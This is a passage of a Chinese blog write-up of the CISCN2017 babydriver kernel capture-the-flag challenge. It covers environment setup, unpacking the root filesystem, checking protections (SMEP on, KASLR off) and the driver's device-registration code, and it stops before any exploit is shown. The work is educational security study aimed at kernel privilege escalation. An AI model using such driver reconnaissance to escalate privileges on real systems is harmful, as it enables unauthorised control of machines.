<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>内核学习入门-CISCN2017_babydriver 复现 | Daily Study</title><meta name="author" content="C0KE"><meta name="copyright" content="C0KE"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="内核学习入门-CISCN2017_babydriver 复现附件题目附件可在此处下载。 题目给了三个文件，分别是：  boot.sh 启动脚本 bzImage 内核启动文件 rootfs.cpio 根文件系统镜像  尝试执行初始时，直接解压 babydriver.tar 并运行启动脚本： 123456# 解压mkdir babydrivertar -xf babydriver.tar -C bab">
<meta property="og:type" content="article">
<meta property="og:title" content="内核学习入门-CISCN2017_babydriver 复现">
<meta property="og:url" content="http://example.com/2024/07/10/%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8-CISCN2017_babydriver%20%E5%A4%8D%E7%8E%B0/index.html">
<meta property="og:site_name" content="Daily Study">
<meta property="og:description" content="内核学习入门-CISCN2017_babydriver 复现附件题目附件可在此处下载。 题目给了三个文件，分别是：  boot.sh 启动脚本 bzImage 内核启动文件 rootfs.cpio 根文件系统镜像  尝试执行初始时，直接解压 babydriver.tar 并运行启动脚本： 123456# 解压mkdir babydrivertar -xf babydriver.tar -C bab">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E5%A4%9C%E6%99%9A.png">
<meta property="article:published_time" content="2024-07-10T09:27:16.472Z">
<meta property="article:modified_time" content="2024-07-10T09:27:16.472Z">
<meta property="article:author" content="C0KE">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E5%A4%9C%E6%99%9A.png"><link rel="shortcut icon" href="/img/fa.jpg"><link rel="canonical" href="http://example.com/2024/07/10/%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8-CISCN2017_babydriver%20%E5%A4%8D%E7%8E%B0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '内核学习入门-CISCN2017_babydriver 复现',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-07-10 17:27:16'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load',() => { preloader.endLoading() })

  if (false) {
    document.addEventListener('pjax:send', () => { preloader.initLoading() })
    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
  }
})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/73c31ad1881611ebb6edd017c2d2eca2.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">370</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">53</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E5%A4%9C%E6%99%9A.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Daily Study"><span class="site-name">Daily Study</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">内核学习入门-CISCN2017_babydriver 复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-07-10T09:27:16.472Z" title="发表于 2024-07-10 17:27:16">2024-07-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-07-10T09:27:16.472Z" title="更新于 2024-07-10 17:27:16">2024-07-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Kernel%E5%AD%A6%E4%B9%A0/">Kernel学习</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="内核学习入门-CISCN2017_babydriver 复现"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="内核学习入门-CISCN2017-babydriver-复现"><a href="#内核学习入门-CISCN2017-babydriver-复现" class="headerlink" title="内核学习入门-CISCN2017_babydriver 复现"></a>内核学习入门-CISCN2017_babydriver 复现</h1><h2 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h2><p>题目附件可在<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/kernel/CISCN2017-babydriver/babydriver.tar">此处</a>下载。</p>
<p>题目给了三个文件，分别是：</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://boot.sh/">boot.sh</a> 启动脚本</li>
<li>bzImage 内核启动文件</li>
<li>rootfs.cpio 根文件系统镜像</li>
</ul>
<h2 id="尝试执行"><a href="#尝试执行" class="headerlink" title="尝试执行"></a>尝试执行</h2><p>初始时，直接解压 <code>babydriver.tar</code> 并运行启动脚本：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解压</span></span><br><span class="line"><span class="built_in">mkdir</span> babydriver</span><br><span class="line">tar -xf babydriver.tar -C babydriver</span><br><span class="line"><span class="comment"># 启动</span></span><br><span class="line"><span class="built_in">cd</span> babydriver </span><br><span class="line">./boot.sh</span><br></pre></td></tr></table></figure>

<p>但 KVM 报错，其报错信息如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Could not access KVM kernel module: No such file or directory</span><br><span class="line">qemu-system-x86_64: failed to initialize kvm: No such file or directory</span><br></pre></td></tr></table></figure>

<p>使用以下命令查看当前 linux in vmware 支不支持虚拟化，发现输出为空，即<strong>不支持</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">egrep &#x27;^flags.*(vmx|svm)&#x27; /proc/cpuinfo</span><br></pre></td></tr></table></figure>

<p>检查了一下物理机的 Virtualization Settings, 已经全部是打开了的。再检查以下 VMware 的CPU配置，发现没有勾选 <code>虚拟化 Intel VT-x/EPT 或 AMD-V/RVI</code>。</p>
<p>勾选后重新启动 linux 虚拟机，提示<code>此平台不支持虚拟化的 Intel VT-x/EPT</code>…</p>
<p>经过一番百度，发现是 Hyper-V 没有禁用彻底。彻底禁用的操作如下：</p>
<ul>
<li><p>控制面板—程序——打开或关闭Windows功能，取消勾选Hyper-V，确定禁用Hyper-V服务</p>
</li>
<li><p><strong>管理员权限</strong>打开 cmd，执行 <code>bcdedit /set hypervisorlaunchtype off</code></p>
<blockquote>
<p>若想重新启用，则执行 <code>bcdedit /set hypervisorlaunchtype auto</code></p>
</blockquote>
</li>
<li><p>重启计算机</p>
</li>
</ul>
<p>之后再启动 linux in Vmware，其内部的 kvm 便可以正常执行了。</p>
<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><h3 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h3><p>查看一下根目录的 <code>/init</code> 文件，不难看出这题需要我们进行<strong>内核提权</strong>，只有提权后才可以查看 flag。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"> </span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag                      # flag 被设置为只有 root 可读</span><br><span class="line">chmod 400 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod /lib/modules/4.4.72/babydriver.ko   # 加载漏洞驱动</span><br><span class="line">chmod 777 /dev/babydev</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>

<h3 id="获取内核模块"><a href="#获取内核模块" class="headerlink" title="获取内核模块"></a>获取内核模块</h3><blockquote>
<p>在提权之前，我们需要先把加载进内核的驱动 dump 出来，这个驱动大概率是一个存在漏洞的驱动。</p>
</blockquote>
<p>首先使用 file 命令查看一下 rootfs.cpio 的文件格式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file rootfs.cpio                 </span><br><span class="line">rootfs.cpio: gzip compressed data, last modified: Tue Jul  4 08:39:15   2017, max compression, from Unix, original size modulo 2^32 2844672</span><br></pre></td></tr></table></figure>

<p>可以看到是一个 gzip 格式的文件，因此我们需要给该文件改一下名称，否则 gunzip 将无法识别文件后缀。之后就是解压 gzip + 解包 cpio 的操作：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> rootfs.cpio rootfs.cpio.gz</span><br><span class="line">gunzip rootfs.cpio.gz</span><br></pre></td></tr></table></figure>

<p>解压之后的文件便是正常的 CPIO 格式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file rootfs.cpio </span><br><span class="line">rootfs.cpio: ASCII cpio archive (SVR4 with no CRC)</span><br></pre></td></tr></table></figure>

<p>使用常规方式给 CPIO 解包即可：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpio -idmv &lt; rootfs.cpio</span><br></pre></td></tr></table></figure>

<p>解包完成后，即可在<code>/lib/modules/4.4.72/babydriver.ko</code>下找到目标驱动。</p>
<h3 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h3><p>首先是驱动程序保护：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec babydriver.ko</span></span><br><span class="line">[*] &#x27;/usr/class/kernel_pwn/CISCN2017-babydriver/babydriver/babydriver.ko&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>

<p>可以看到这里只开启了 NX 保护。</p>
<p>接着再看看 qemu 启动参数，发现启动了 smep 保护。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -initrd rootfs.cpio \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append &#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27; \</span><br><span class="line">    -enable-kvm \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -m 64M \</span><br><span class="line">    --nographic  \</span><br><span class="line">    -smp cores=1,threads=1 \</span><br><span class="line">    -cpu kvm64,+smep      # &lt;- 启用 +smep 保护</span><br></pre></td></tr></table></figure>

<blockquote>
<p>SMEP（Supervisor Mode Execution Protection 管理模式执行保护）：<strong>禁止CPU处于 ring0 模式时执行用户空间代码</strong>。</p>
<p>还有一个比较相近的保护措施是 SMAP（Superivisor Mode Access Protection 管理模式访问保护）：禁止内核CPU访问用户空间的数据。</p>
</blockquote>
<p>注意到 <strong>没有启动 kaslr</strong>。</p>
<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><h4 id="设备文件"><a href="#设备文件" class="headerlink" title="设备文件"></a><strong>设备文件</strong></h4><p>在分析内核模块文件前，我们先来简单学习一下设备文件的相关知识</p>
<h5 id="设备号"><a href="#设备号" class="headerlink" title="设备号"></a>设备号</h5><p>对于<strong>所有</strong>设备文件来说，一共分为三种，分别是：</p>
<ul>
<li>字符设备（ char device），例如控制台</li>
<li>块设备（block device），例如文件系统</li>
<li>网络设备（network device），例如网卡</li>
</ul>
<p>设备文件可以通过设备文件名来访问，通常位于 &#x2F;dev 目录下。<code>ls -a</code> 出来的第一个字符即说明了当前设备文件的类型：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">c 表示字符设备</span></span><br><span class="line">crw-rw-rw-   1 root tty       5,   0 Oct  3 15:03 0</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">l 表示符号链接</span></span><br><span class="line">lrwxrwxrwx   1 root root          15 Oct  2 23:43 stdout -&gt; /proc/self/fd/1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">- 表示常规文件</span></span><br><span class="line">-rw-rw-r--  1 Kiprey Kiprey  203792 Jun 16  2017 babydriver.ko</span><br></pre></td></tr></table></figure>

<p>我们可以在<strong>设备文件条目</strong>中最后一次修改日期之前看到两个数字(用逗号分隔)，例如上面的 <code>5, 0</code>（这个位置通常显示的是普通文件的<strong>文件长度</strong>），对于<strong>设备文件条目</strong>的信息中，形如<code>5,0</code>这样的一对数字，分别是特定设备的<strong>主设备号</strong>和<strong>副设备号</strong>。</p>
<p>在传统意义上，<strong>主设备号</strong>标识与设备相关的<strong>驱动程序</strong>。例如，<code>/dev/null</code> 和 <code>/dev/zero</code> 都是由驱动1管理的。而多个串行终端（即 ttyX, ttySX）是由驱动4管理的。现代的Linux内核已经<strong>支持多个驱动程序共享主设备号</strong>，但是我们仍然可以看到，目前大多数设备仍然是按照<strong>一个主设备号对应一个驱动程序</strong>的方式来组织的。</p>
<p>内核<strong>使用副设备号来确定引用的是哪个设备</strong>，但副设备号的作用仅限于此，内核不会知道更多关于某个特定副设备号的信息。</p>
<p>主设备号和副设备号可同时保存与类型 <code>dev_t</code> 中，而该类型实际上是一个 <code>u32</code>；其中的12位用于保存主设备号，20位用于保存副设备号。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> u32 <span class="type">__kernel_dev_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">__kernel_dev_t</span>    <span class="type">dev_t</span>;</span><br></pre></td></tr></table></figure>

<p>在编写驱动程序需要使用主副设备号时，最好不要直接进行位运算操作，而是使用 <code>&lt;linux/kdev_t.h&gt;</code> 头文件中的宏定义操作：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAJOR(dev)    ((dev)&gt;&gt;8)              <span class="comment">// 获取主设备号</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MINOR(dev)    ((dev) &amp; 0xff)          <span class="comment">// 获取副设备号</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MKDEV(ma,mi)  ((ma)&lt;&lt;8 | (mi))        <span class="comment">// 从主副设备号中生成一个 dev_t 类型的变量</span></span></span><br></pre></td></tr></table></figure>

<p>设备文件相关的内容暂时到此为止，现在回归题目。</p>
<h4 id="babydriver-init"><a href="#babydriver-init" class="headerlink" title="babydriver_init"></a>babydriver_init</h4><p>先上代码，这里重点关注红框框住的部分（其余部分是异常处理）</p>
<p><a target="_blank" rel="noopener" href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20221022230518.png">![image-20240419171902516](&#x2F;picture&#x2F;内核学习入门-CISCN2017_babydriver 复现&#x2F;image-20240419171902516.png)</a></p>
<p>简单精简一下，实际关键代码如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">alloc_chrdev_region(&amp;babydev_no, <span class="number">0</span>, <span class="number">1</span>, <span class="string">&quot;babydev&quot;</span>);</span><br><span class="line"></span><br><span class="line">cdev_init(&amp;cdev_0, &amp;fops);</span><br><span class="line">cdev_0.owner = &amp;_this_module;</span><br><span class="line"></span><br><span class="line">cdev_add(&amp;cdev_0, babydev_no, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">babydev_class = _class_create(&amp;_this_module, <span class="string">&quot;babydev&quot;</span>, &amp;babydev_no);</span><br><span class="line"></span><br><span class="line">device_create(babydev_class, <span class="number">0</span>, babydev_no, <span class="number">0</span>, <span class="string">&quot;babydev&quot;</span>);</span><br></pre></td></tr></table></figure>

<h5 id="申请设备号"><a href="#申请设备号" class="headerlink" title="申请设备号"></a>申请设备号</h5><p>首先，babydriver_init 函数将会调用 <code>alloc_chrdev_region</code> 函数。该函数的函数声明如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * alloc_chrdev_region() - register a range of char device numbers</span></span><br><span class="line"><span class="comment"> * @dev: output parameter for first assigned number</span></span><br><span class="line"><span class="comment"> * @baseminor: first of the requested range of minor numbers</span></span><br><span class="line"><span class="comment"> * @count: the number of minor numbers required</span></span><br><span class="line"><span class="comment"> * @name: the name of the associated device or driver</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Allocates a range of char device numbers.  The major number will be</span></span><br><span class="line"><span class="comment"> * chosen dynamically, and returned (along with the first minor number)</span></span><br><span class="line"><span class="comment"> * in @dev.  Returns zero or a negative error code.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">alloc_chrdev_region</span><span class="params">(<span class="type">dev_t</span> *dev, <span class="type">unsigned</span> baseminor, <span class="type">unsigned</span> count,</span></span><br><span class="line"><span class="params">      <span class="type">const</span> <span class="type">char</span> *name)</span></span><br></pre></td></tr></table></figure>

<p>根据当前函数的调用代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alloc_chrdev_region(&amp;babydev_no, <span class="number">0</span>, <span class="number">1</span>, <span class="string">&quot;babydev&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>我们不难看出，babydriver_init 函数尝试向内核申请一个<strong>字符设备</strong>的新的<strong>主设备号</strong>，其中副设备号从0开始，设备名称为 <code>babydev</code>，并将申请到的主副设备号存入 babydev_no 全局变量中。</p>
<blockquote>
<p>还有一个名为<code>register_chrdev_region</code>的函数，它在调用时需要指定<strong>主副设备号的起始值</strong>，要求内核在起始值的基础上进行分配，与 <code>alloc_chrdev_region</code>功能相似但又有所不同。</p>
</blockquote>
<p>设备号分配完成后，我们需要将其连接到实现设备操作的内部函数。</p>
<h5 id="注册字符设备"><a href="#注册字符设备" class="headerlink" title="注册字符设备"></a>注册字符设备</h5><p>内核使用 <code>cdev</code> 类型的结构来表示字符设备，因此在操作设备之前，内核必须<strong>初始化</strong>+<strong>注册</strong>一个这样的结构体。</p>
<blockquote>
<p>注意，一个驱动程序可以分配不止一个设备号，创建不止一个设备。</p>
</blockquote>
<p>该函数的执行代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cdev_init(&amp;cdev_0, &amp;fops);</span><br></pre></td></tr></table></figure>

<p>cdev 结构体的初始化函数如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * cdev_init() - initialize a cdev structure</span></span><br><span class="line"><span class="comment"> * @cdev: the structure to initialize</span></span><br><span class="line"><span class="comment"> * @fops: the file_operations for this device</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Initializes @cdev, remembering @fops, making it ready to add to the</span></span><br><span class="line"><span class="comment"> * system with cdev_add().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">cdev_init</span><span class="params">(<span class="keyword">struct</span> cdev *cdev, <span class="type">const</span> <span class="keyword">struct</span> file_operations *fops)</span></span><br></pre></td></tr></table></figure>

<p>正如注释中写到，传入的 cdev 指针所对应的 <code>struct cdev</code> 将会被初始化，同时<strong>设置该设备的各类操作</strong>为传入的 <code>file_operations</code>结构体指针。</p>
<p><code>file_operations</code>结构体中包含了大量的函数指针：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 